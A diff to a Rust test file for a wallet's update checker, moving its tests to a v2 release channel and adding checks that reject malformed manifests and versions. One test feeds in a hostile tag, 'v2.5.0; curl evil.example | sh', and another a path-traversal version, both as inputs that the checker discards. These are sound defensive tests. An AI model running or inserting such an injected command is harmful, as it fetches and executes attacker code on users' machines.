@@ -191,35 +191,124 @@ fn a_repository_override_is_owner_and_name_only() {
 
 #[tokio::test]
 async fn an_available_update_directs_the_user_to_the_verified_updater() {
-    let check = check_at("1.4.2", at("2026-08-08T00:00:00Z"), Some("v1.5.0")).await;
+    let check = check_at("2.4.2", at("2026-08-08T00:00:00Z"), Some("v2.5.0")).await;
 
     assert!(check.update_available);
-    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
+    assert_eq!(check.latest_version.as_deref(), Some("v2.5.0"));
     assert_eq!(check.source, CheckSource::Network);
     assert_eq!(
         check.release_url.as_deref(),
-        Some("https://github.com/EkuboProtocol/wallet/releases/latest")
+        Some("https://github.com/EkuboProtocol/wallet/releases/tag/v2.5.0")
     );
     assert!(check.instruction.contains("Updates"));
-    assert!(check.instruction.contains("download, verify, and install"));
+    assert!(check.instruction.contains("does not verify its signature"));
+    if cfg!(target_os = "macos") {
+        assert!(check.instruction.contains("download, verify, and install"));
+    } else {
+        assert!(check.instruction.contains("signed manual installer"));
+    }
+    assert!(check.notice().unwrap().contains(update_guidance()));
     assert!(check.notice().is_some());
+}
+
+#[test]
+fn discovery_uses_the_fixed_v2_asset_even_for_a_repository_override() {
+    assert_eq!(
+        manifest_url(REPOSITORY).as_deref(),
+        Some("https://github.com/EkuboProtocol/wallet/releases/download/v2-channel/latest-v2.json")
+    );
+    assert_eq!(
+        manifest_url("developer/wallet-test").as_deref(),
+        Some(
+            "https://github.com/developer/wallet-test/releases/download/v2-channel/latest-v2.json"
+        )
+    );
+    assert!(manifest_url("owner/repo/extra").is_none());
+}
+
+#[test]
+fn manifest_requires_v2_product_channel_and_a_stable_major_two_version() {
+    let manifest = serde_json::json!({
+        "product": "org.ekubo.wallet.v2",
+        "channel": "v2",
+        "version": "2.5.0",
+        "tag_name": "v1.99.0",
+        "url": "https://untrusted.example/ignored"
+    });
+    assert_eq!(
+        manifest_tag(&manifest.to_string()).as_deref(),
+        Some("v2.5.0")
+    );
+    for (field, value) in [
+        ("product", serde_json::json!("org.ekubo.wallet")),
+        ("channel", serde_json::json!("stable")),
+        ("channel", serde_json::json!("v3")),
+        ("version", serde_json::json!("1.99.0")),
+        ("version", serde_json::json!("3.0.0")),
+        ("version", serde_json::json!("2.5.0-rc.1")),
+        ("version", serde_json::json!("2.5")),
+        ("version", serde_json::json!("2.05.0")),
+        ("version", serde_json::json!("2.5.0+")),
+        ("version", serde_json::json!("v2.5.0/../../latest")),
+        ("version", serde_json::json!(2)),
+    ] {
+        let mut invalid = manifest.clone();
+        invalid[field] = value;
+        assert!(manifest_tag(&invalid.to_string()).is_none(), "{invalid}");
+    }
+    for field in ["product", "channel", "version"] {
+        let mut missing = manifest.clone();
+        missing.as_object_mut().unwrap().remove(field);
+        assert!(manifest_tag(&missing.to_string()).is_none(), "{missing}");
+    }
+    assert!(manifest_tag("not JSON").is_none());
+    assert!(manifest_tag(r#"{"tag_name":"v2.5.0"}"#).is_none());
+}
+
+#[tokio::test]
+async fn normalized_versions_link_to_the_exact_release_in_the_selected_repository() {
+    let check = check_with(
+        "2.4.0",
+        "developer/wallet-test",
+        at("2026-08-08T00:00:00Z"),
+        false,
+        || async { Some(" 2.5.0+build.7 ".to_string()) },
+    )
+    .await;
+    assert!(check.update_available);
+    assert_eq!(check.latest_version.as_deref(), Some("v2.5.0+build.7"));
+    assert_eq!(
+        check.release_url.as_deref(),
+        Some("https://github.com/developer/wallet-test/releases/tag/v2.5.0+build.7")
+    );
+}
+
+#[tokio::test]
+async fn check_boundary_refuses_other_majors_prereleases_and_invalid_versions() {
+    for version in ["v1.99.0", "v3.0.0", "v2.5.0-rc.1", "2.5", "2.5.0+"] {
+        let check = check_at("2.0.0", at("2026-08-08T00:00:00Z"), Some(version)).await;
+        assert_eq!(check.source, CheckSource::Unavailable, "{version}");
+        assert!(!check.update_available);
+        assert!(check.latest_version.is_none());
+        assert!(check.release_url.is_none());
+    }
 }
 
 #[tokio::test]
 async fn a_current_build_offers_no_notice() {
-    let check = check_at("1.5.0", at("2026-08-08T00:00:00Z"), Some("v1.5.0")).await;
+    let check = check_at("2.5.0", at("2026-08-08T00:00:00Z"), Some("v2.5.0")).await;
 
     assert!(!check.update_available);
-    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
+    assert_eq!(check.latest_version.as_deref(), Some("v2.5.0"));
     assert!(check.notice().is_none());
 }
 
 #[tokio::test]
 async fn a_malicious_tag_is_discarded_rather_than_interpolated() {
     let check = check_at(
-        "1.4.2",
+        "2.4.2",
         at("2026-08-08T00:00:00Z"),
-        Some("v1.5.0; curl evil.example | sh"),
+        Some("v2.5.0; curl evil.example | sh"),
     )
     .await;
 
@@ -229,22 +318,22 @@ async fn a_malicious_tag_is_discarded_rather_than_interpolated() {
 
 #[tokio::test]
 async fn every_check_asks_the_endpoint_for_the_latest_release() {
-    let first = check_at("1.4.2", at("2026-08-08T00:00:00Z"), Some("v1.5.0")).await;
+    let first = check_at("2.4.2", at("2026-08-08T00:00:00Z"), Some("v2.5.0")).await;
     assert_eq!(first.source, CheckSource::Network);
 
     // A later explicit check must use the endpoint's newer answer rather than
     // preserve the first one in process or on disk.
     let second = check_with(
-        "1.4.2",
+        "2.4.2",
         REPOSITORY,
         at("2026-08-08T01:00:00Z"),
         false,
-        || async { Some("v1.6.0".to_string()) },
+        || async { Some("v2.6.0".to_string()) },
     )
     .await;
 
     assert_eq!(second.source, CheckSource::Network);
-    assert_eq!(second.latest_version.as_deref(), Some("v1.6.0"));
+    assert_eq!(second.latest_version.as_deref(), Some("v2.6.0"));
     assert_eq!(second.checked_at, Some(at("2026-08-08T01:00:00Z")));
 }
 
@@ -259,7 +348,7 @@ fn release_checks_have_no_persistent_tag_cache() {
 
 #[tokio::test]
 async fn being_offline_is_not_an_error() {
-    let check = check_at("1.4.2", at("2026-08-08T00:00:00Z"), None).await;
+    let check = check_at("2.4.2", at("2026-08-08T00:00:00Z"), None).await;
 
     assert_eq!(check.source, CheckSource::Unavailable);
     assert!(!check.update_available);
@@ -272,7 +361,7 @@ async fn being_offline_is_not_an_error() {
 #[tokio::test]
 async fn the_environment_can_turn_the_check_off_entirely() {
     let check = check_with(
-        "1.4.2",
+        "2.4.2",
         REPOSITORY,
         at("2026-08-08T00:00:00Z"),
         true,
